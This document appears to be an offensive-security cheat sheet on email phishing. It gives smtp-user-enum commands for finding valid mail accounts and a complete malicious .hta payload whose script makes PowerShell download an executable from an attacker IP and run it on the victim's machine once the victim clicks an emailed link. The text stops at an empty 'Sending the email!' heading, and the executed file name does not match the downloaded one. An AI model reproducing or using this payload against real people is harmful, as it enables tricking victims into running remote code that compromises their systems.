## Phishing through Email

First of all, you need to find a valid email account to send the phish to. This could either be through enumeration of the web portals or if SMTP is open, using the following enum command
```bash
# Can check via manual telnet to see which method is allowed
$ smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
```

### Payload - Via .hta

- Only works if victim is using IE and hence mshta.exe will execute the .hta payload
- Lets prepare a .hta payload which we can serve as a link in our email's body to entice the victim to click and execute
- Payload from simple to complex
- We call the below evil.hta

**Simple Powershell Download EXE and Execute**
- No AMSI and Applocker bypass so will likely download the EXE but fail to execute

```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var r = shell.Run("powershell.exe iwr -uri http://<ip>/msf.exe -outfile C:\\users\\public\\msf.exe; C:\\users\\public\\rmsf.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```



### Sending the email!

